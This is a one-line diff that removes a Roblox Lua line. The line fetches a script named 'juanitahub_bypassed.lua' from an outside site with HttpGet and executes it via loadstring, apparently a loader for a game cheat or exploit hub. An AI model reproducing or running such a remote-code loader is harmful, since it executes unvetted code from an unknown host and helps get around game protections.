@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://xetbin.xyz/scripts/juanitahub_bypassed.lua'))()
